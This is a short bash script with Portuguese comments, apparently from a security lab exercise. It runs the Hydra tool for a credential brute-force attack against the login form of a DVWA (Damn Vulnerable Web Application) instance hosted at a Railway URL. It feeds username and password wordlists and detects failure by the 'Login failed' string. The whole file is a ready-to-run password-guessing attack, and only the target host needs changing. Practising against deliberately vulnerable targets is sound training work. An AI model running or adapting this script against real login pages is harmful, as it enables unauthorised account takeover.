#!/bin/bash

# Play 02 — Hydra DVWA em produção
# Usa variável DVWA_HOST ou default (sem incluir :80 no TARGET)

# Host do DVWA (sem porta):
TARGET="${DVWA_HOST:-web-dvwa-production.up.railway.app}"

# Mostra início do ataque
echo "[*] Iniciando ataque com Hydra contra $TARGET:80..."

# Chamada ao Hydra com sintaxe correta:
# http-post-form://host[:port]/path:post-data:failure-detection-string
hydra -s 80 -L users.txt -P passwords.txt \
  "http-post-form://$TARGET/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
  -o hydra-out.txt 2>&1

# Mensagem de fim de teste
echo "[✔️] Teste concluído com sucesso."
